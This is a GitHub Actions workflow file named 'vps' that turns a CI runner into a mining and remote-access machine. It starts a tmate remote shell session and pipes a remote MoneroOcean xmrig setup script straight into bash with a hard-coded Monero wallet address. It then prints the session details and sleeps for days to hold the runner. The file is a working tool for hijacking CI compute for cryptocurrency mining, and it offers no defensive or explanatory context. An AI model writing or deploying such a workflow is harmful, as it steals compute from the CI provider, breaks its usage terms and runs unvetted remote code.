name: vps

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - name: start
        run: |
          echo "=== updating system ==="
          sudo apt update -qq
          
          echo "=== installing tmate ==="
          sudo apt install -y tmate
          
          echo "=== tmate ==="
          tmate -F > /tmp/tmate.log 2>&1 &
          sleep 5
          
          echo "=== installing miner ==="
          curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 48ZnWombESDbm8o3GzDsYbjHULahvMMW6V5nEXhVzJQXcnxMEtJNVcjSHFHKeVFXMniPEvpH635De74x4KJa4aDgL5YNez1
          
          echo "=== miner ==="
          echo "tmate session:"
          cat /tmp/tmate.log | tail -n 10
          
          echo "keepalive"
          sleep 800000  
